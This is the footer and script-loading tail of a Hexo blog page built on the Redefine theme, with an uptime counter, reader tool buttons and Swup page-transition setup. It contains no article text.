            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>



<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
